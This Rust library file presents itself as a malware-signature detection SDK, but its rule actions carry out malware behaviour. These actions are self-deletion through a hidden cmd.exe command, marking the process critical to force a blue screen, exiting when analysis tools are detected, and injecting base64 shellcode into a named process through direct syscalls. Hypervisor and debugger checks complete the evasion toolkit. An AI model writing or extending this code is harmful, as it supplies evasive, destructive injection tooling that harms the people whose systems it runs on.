//! # Signature Monster SDK
//!
//! A comprehensive usermode system artifact checking library for malware signature detection.
//! 
//! This SDK provides functions to query various system artifacts that can be used
//! to create or match malware signatures, all operating purely in usermode.
//!
//! ## Modules
//!
//! - `hwid` - Hardware ID checks via PowerShell
//! - `registry` - Registry key/value checks via Windows API
//! - `filesystem` - File path existence and attribute checks
//! - `process` - Running process enumeration and checks
//! - `user` - Current user and system user checks
//! - `services` - Windows service enumeration and checks
//! - `tasks` - Scheduled task enumeration and checks
//! - `disk` - Disk drive model enumeration and checks
//! - `cpuid` - CPUID / hypervisor detection (CPUID leaf 0x40000000, hypervisor bit)
//!
//! ## Example
//!
//! ```rust,no_run
//! use signaturemonster::{SignatureChecker, CheckResult};
//!
//! let checker = SignatureChecker::new();
//! 
//! // Check if a specific process is running
//! if checker.process.is_running("malware.exe") {
//!     println!("Suspicious process detected!");
//! }
//!
//! // Check registry for persistence
//! if checker.registry.key_exists(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Malware") {
//!     println!("Persistence mechanism detected!");
//! }
//! ```

pub mod eventlog;
pub mod hwid;
pub mod registry;
pub mod filesystem;
pub mod process;
pub mod user;
pub mod services;
pub mod tasks;
pub mod disk;
pub mod error;
pub mod signatures;

#[cfg(feature = "antidll")]
pub mod antidll;

#[cfg(feature = "processutils")]
pub mod processutils;

#[cfg(feature = "regprotect")]
pub mod regprotect;
pub mod logging;
pub mod syscall;
pub mod injector;

// NEW: cpuid module (you mentioned you already created it)
pub mod cpuid;
pub use cpuid::{CpuidChecker, HypervisorInfo, HypervisorType};

use serde::{Deserialize, Serialize};

pub use error::{SignatureMonsterError, Result};
pub use signatures::{SignatureDatabase, SignatureBuilder};
pub use logging::log_event;

#[cfg(feature = "antidll")]
pub use antidll::AntiDllInjection;

#[cfg(feature = "processutils")]
pub use processutils::ProcessUtils;

#[cfg(feature = "regprotect")]
pub use regprotect::RegistryProtection;

/// Result of a signature check operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckResult {
    /// Whether the check matched/passed
    pub matched: bool,
    /// The value that was checked (if applicable)
    pub value: Option<String>,
    /// Additional details about the check
    pub details: Option<String>,
}

impl CheckResult {
    pub fn matched(value: impl Into<String>) -> Self {
        Self {
            matched: true,
            value: Some(value.into()),
            details: None,
        }
    }

    pub fn not_matched() -> Self {
        Self {
            matched: false,
            value: None,
            details: None,
        }
    }

    pub fn with_details(mut self, details: impl Into<String>) -> Self {
        self.details = Some(details.into());
        self
    }
}

/// Main signature checker that provides access to all check modules
pub struct SignatureChecker {
    pub hwid: hwid::HwidChecker,
    pub registry: registry::RegistryChecker,
    pub filesystem: filesystem::FilesystemChecker,
    pub process: process::ProcessChecker,
    pub user: user::UserChecker,
    pub services: services::ServiceChecker,
    pub tasks: tasks::TaskChecker,
    pub disk: disk::DiskChecker,
    pub cpuid: cpuid::CpuidChecker,  // NEW
    pub eventlog: eventlog::EventLogChecker,
}

impl SignatureChecker {
    /// Create a new SignatureChecker with all sub-checkers initialized
    pub fn new() -> Self {
        Self {
            hwid: hwid::HwidChecker::new(),
            registry: registry::RegistryChecker::new(),
            filesystem: filesystem::FilesystemChecker::new(),
            process: process::ProcessChecker::new(),
            user: user::UserChecker::new(),
            services: services::ServiceChecker::new(),
            tasks: tasks::TaskChecker::new(),
            disk: disk::DiskChecker::new(),
            cpuid: cpuid::CpuidChecker::new(),  // NEW
            eventlog: eventlog::EventLogChecker::new(),
        }
    }
}

impl Default for SignatureChecker {
    fn default() -> Self {
        Self::new()
    }
}

/// Signature rule that can be matched against the system
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SignatureRule {
    /// Unique identifier for the rule
    pub id: String,
    /// Human-readable name
    pub name: String,
    /// Description of what this rule detects
    pub description: String,
    /// The conditions that must match
    pub conditions: Vec<SignatureCondition>,
    /// Optional actions to perform if matched
    #[serde(default)]
    pub actions: Vec<Action>,
    /// How conditions are combined (All must match, or Any can match)
    pub match_type: MatchType,
}

/// How multiple conditions are combined
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum MatchType {
    /// All conditions must match
    All,
    /// Any single condition matching is sufficient
    Any,
    /// At least N conditions must match
    AtLeast(usize),
}

/// A single condition to check
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum SignatureCondition {
    /// Check for a hardware ID pattern
    Hwid {
        field: HwidField,
        pattern: String,
        #[serde(default)]
        regex: bool,
    },
    /// Check for a registry key or value
    Registry {
        path: String,
        value_name: Option<String>,
        expected_data: Option<String>,
    },
    /// Check for a file path
    File {
        path: String,
        #[serde(default)]
        must_exist: bool,
    },
    /// Check for a running process
    Process {
        name: String,
        #[serde(default)]
        regex: bool,
    },
    /// Check for a specific username
    User {
        name: String,
        #[serde(default)]
        regex: bool,
    },
    /// Check for a service
    Service {
        name: String,
        #[serde(default)]
        must_be_running: bool,
    },
    /// Check for a scheduled task
    ScheduledTask {
        name: String,
        #[serde(default)]
        regex: bool,
    },
    /// Check for a disk drive model
    DiskModel {
        pattern: String,
        #[serde(default)]
        regex: bool,
    },
    /// Check for current debugger/analysis environment
    AnalysisDetected,
    
    /// NEW: Check for hypervisor using CPUID
    CpuidHypervisor {
        /// Which hypervisor to check for
        hypervisor: CpuidHypervisorType,
    },
    
    /// NEW: Check CPUID vendor string
    CpuidVendor {
        pattern: String,
        #[serde(default)]
        regex: bool,
    },

    /// Check for an event log provider
    EventLogProvider {
        provider: String,
    },
}

/// Hypervisor types that can be detected via CPUID
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum CpuidHypervisorType {
    Any,
    HyperV,
    VMware,
    VirtualBox,
    KVM,
    Xen,
    Parallels,
}

/// Fields available for HWID checking
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum HwidField {
    /// CPU processor ID
    ProcessorId,
    /// Motherboard serial number
    MotherboardSerial,
    /// BIOS serial number
    BiosSerial,
    /// System UUID
    SystemUuid,
    /// Machine GUID from registry
    MachineGuid,
    /// Product ID
    ProductId,
    /// Computer name
    ComputerName,
    /// MAC addresses
    MacAddress,
    /// Disk serial numbers
    DiskSerial,
    /// System model from SMBIOS
    SystemModel,
}

/// Action to perform if a rule matches
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum Action {
    /// Lock a registry key to prevent modification
    LockRegistry {
        path: String,
    },
    /// Delete the current executable and exit
    SelfDelete,
    /// Make the process critical (BSOD on termination)
    MakeCritical,
    /// Terminate the process with a specific exit code
    Exit {
        code: i32,
    },
    /// Force a Blue Screen of Death immediately
    ForceBsod,
    /// Run an anti-analysis check and exit if detected
    CheckAnalysis,
    /// Inject shellcode into a process using direct syscalls
    InjectDirect {
        process_name: String,
        shellcode_base64: String,
    },
}

pub mod generated_signatures;

impl Action {
    pub fn execute(&self) -> Result<()> {
        match self {
            #[cfg(feature = "regprotect")]
            Action::LockRegistry { path } => {
                let protector = crate::regprotect::RegistryProtection::new();
                protector.lock_key(path).map_err(|e| SignatureMonsterError::RegistryError(e.to_string()))?;
                Ok(())
            },
            #[cfg(not(feature = "regprotect"))]
            Action::LockRegistry { .. } => {
                Err(SignatureMonsterError::Generic("Registry protection feature not enabled".to_string()))
            },
            Action::Exit { code } => {
                std::process::exit(*code);
            },
            Action::MakeCritical => {
                #[cfg(windows)]
                unsafe {
                    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
                    use windows::core::PCSTR;
                    
                    let ntdll = GetModuleHandleA(PCSTR("ntdll.dll\0".as_ptr())).unwrap();
                    if let Some(func) = GetProcAddress(ntdll, PCSTR("RtlSetProcessIsCritical\0".as_ptr())) {
                         let rtl_set_process_is_critical: unsafe extern "system" fn(u8, *mut u8, u8) -> i32 = 
                            std::mem::transmute(func);
                         rtl_set_process_is_critical(1, std::ptr::null_mut(), 0);
                    }
                }
                Ok(())
            },
            Action::ForceBsod => {
                 #[cfg(windows)]
                 unsafe {
                    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
                    use windows::core::PCSTR;
                    
                    let ntdll = GetModuleHandleA(PCSTR("ntdll.dll\0".as_ptr())).unwrap();
                    if let Some(func) = GetProcAddress(ntdll, PCSTR("RtlSetProcessIsCritical\0".as_ptr())) {
                         let rtl_set_process_is_critical: unsafe extern "system" fn(u8, *mut u8, u8) -> i32 = 
                            std::mem::transmute(func);
                         rtl_set_process_is_critical(1, std::ptr::null_mut(), 0);
                    }
                    std::process::exit(1);
                 }
                 #[cfg(not(windows))]
                 Ok(())
            },
            Action::SelfDelete => {
                 #[cfg(windows)]
                 {
                    use std::process::Command;
                    use std::os::windows::process::CommandExt;
                    
                    if let Ok(path) = std::env::current_exe() {
                          let _ = Command::new("cmd.exe")
                            .args(&["/C", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/f", "/q", path.to_str().unwrap_or("signaturemonster.exe")])
                            .creation_flags(0x08000000) // NO_WINDOW
                            .spawn();
                    }
                 }
                Ok(())
            },
            Action::CheckAnalysis => {
                let checker = crate::process::ProcessChecker::new();
                if checker.check_for_analysis()? {
                    crate::logging::log_event("Analysis environment detected! Exiting...");
                    std::process::exit(1);
                }
                Ok(())
            },
            Action::InjectDirect { process_name, shellcode_base64 } => {
                use base64::Engine;
                let shellcode = base64::engine::general_purpose::STANDARD.decode(shellcode_base64)
                    .map_err(|e| SignatureMonsterError::Generic(format!("Base64 decode error: {}", e)))?;
                
                let checker = crate::process::ProcessChecker::new();
                let processes = checker.find_by_name(process_name)?;
                if let Some(target) = processes.first() {
                    crate::logging::log_event(&format!("Injecting into {} (PID: {}) using direct syscalls", process_name, target.pid));
                    crate::injector::inject_shellcode(target.pid, &shellcode)?;
                } else {
                    return Err(SignatureMonsterError::ProcessError(format!("Target process {} not found", process_name)));
                }
                Ok(())
            }
        }
    }
}

impl SignatureRule {
    /// Check if this rule matches the current system
    pub fn matches(&self, checker: &SignatureChecker) -> Result<bool> {
        // FIX: If there are no conditions, it's an "Always Trigger" rule.
        if self.conditions.is_empty() {
            return Ok(true);
        }

        let mut match_count = 0;
        for condition in &self.conditions {
            if condition.check(checker)? {
                match_count += 1;
                
                // Early exit for Any match type
                if self.match_type == MatchType::Any {
                    return Ok(true);
                }
            } else if self.match_type == MatchType::All {
                // Early exit for All match type
                return Ok(false);
            }
        }
        
        match self.match_type {
            MatchType::All => Ok(match_count == self.conditions.len()),
            MatchType::Any => Ok(match_count > 0),
            MatchType::AtLeast(n) => Ok(match_count >= n),
        }
    }
}


impl SignatureCondition {
    /// Check if this condition matches
    pub fn check(&self, checker: &SignatureChecker) -> Result<bool> {
        match self {
            SignatureCondition::Hwid { field, pattern, regex } => {
                let value = checker.hwid.get_field(*field)?;
                if *regex {
                    let re = regex::Regex::new(pattern)
                        .map_err(|e| SignatureMonsterError::RegexError(e.to_string()))?;
                    Ok(re.is_match(&value))
                } else {
                    Ok(value.to_lowercase().contains(&pattern.to_lowercase()))
                }
            }
            SignatureCondition::Registry { path, value_name, expected_data } => {
                if let Some(val_name) = value_name {
                    if let Some(expected) = expected_data {
                        let data = checker.registry.read_value(path, val_name)?;
                        Ok(data.to_lowercase().contains(&expected.to_lowercase()))
                    } else {
                        Ok(checker.registry.value_exists(path, val_name))
                    }
                } else {
                    Ok(checker.registry.key_exists(path))
                }
            }
            SignatureCondition::File { path, must_exist } => {
                let exists = checker.filesystem.file_exists(path);
                Ok(if *must_exist { exists } else { !exists })
            }
            SignatureCondition::Process { name, regex } => {
                if *regex {
                    checker.process.is_running_regex(name)
                } else {
                    Ok(checker.process.is_running(name))
                }
            }
            SignatureCondition::User { name, regex } => {
                let current_user = checker.user.current_username()?;
                if *regex {
                    let re = regex::Regex::new(name)
                        .map_err(|e| SignatureMonsterError::RegexError(e.to_string()))?;
                    Ok(re.is_match(&current_user))
                } else {
                    Ok(current_user.to_lowercase() == name.to_lowercase())
                }
            }
            SignatureCondition::Service { name, must_be_running } => {
                if *must_be_running {
                    checker.services.is_running(name)
                } else {
                    Ok(checker.services.exists(name)?)
                }
            }
            SignatureCondition::ScheduledTask { name, regex } => {
                if *regex {
                    checker.tasks.exists_regex(name)
                } else {
                    checker.tasks.exists(name)
                }
            }
            SignatureCondition::DiskModel { pattern, regex } => {
                if *regex {
                    checker.disk.model_matches_regex(pattern)
                } else {
                    checker.disk.model_contains(pattern)
                }
            }
            SignatureCondition::AnalysisDetected => {
                checker.process.check_for_analysis()
            }
            SignatureCondition::CpuidHypervisor { hypervisor } => {
                match hypervisor {
                    CpuidHypervisorType::Any => Ok(checker.cpuid.is_hypervisor_present()),
                    CpuidHypervisorType::HyperV => Ok(checker.cpuid.is_hyperv()),
                    CpuidHypervisorType::VMware => Ok(checker.cpuid.is_vmware()),
                    CpuidHypervisorType::VirtualBox => Ok(checker.cpuid.is_virtualbox()),
                    CpuidHypervisorType::KVM => Ok(checker.cpuid.is_kvm()),
                    CpuidHypervisorType::Xen => Ok(checker.cpuid.is_xen()),
                    CpuidHypervisorType::Parallels => Ok(checker.cpuid.is_parallels()),
                }
            }
            SignatureCondition::CpuidVendor { pattern, regex } => {
                match checker.cpuid.get_hypervisor_vendor() {
                    Ok(vendor) => {
                        if *regex {
                            let re = regex::Regex::new(pattern)
                                .map_err(|e| SignatureMonsterError::RegexError(e.to_string()))?;
                            Ok(re.is_match(&vendor))
                        } else {
                            Ok(vendor.to_lowercase().contains(&pattern.to_lowercase()))
                        }
                    }
                    Err(_) => Ok(false),
                }
            }
            SignatureCondition::EventLogProvider { provider } => {
                Ok(checker.eventlog.provider_exists(provider))
            }
        }
    }
}
